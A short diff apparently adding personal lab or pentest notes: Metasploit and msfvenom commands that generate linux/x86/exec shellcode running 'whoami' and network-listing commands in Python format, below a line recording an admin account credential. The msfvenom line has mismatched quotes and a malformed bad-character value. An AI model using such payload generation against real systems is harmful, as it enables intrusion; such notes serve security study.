@@ -50,3 +50,9 @@ mem2:
 ----------------------------------------------------------------------------------------------------
 CREATE ADMIN ACCOUNT: ebHwRYOhGk0yyRm51ESj
 ----------------------------------------------------------------------------------------------------
+msfconsole
+use payload/linux/x86/exec
+show options
+set CMD 'whoami && ip a'
+generate -b '\x00' -f python
+msfvenom -p linux/x86/exec CMD="whoami && ifconfig' -b 'x00' -f python
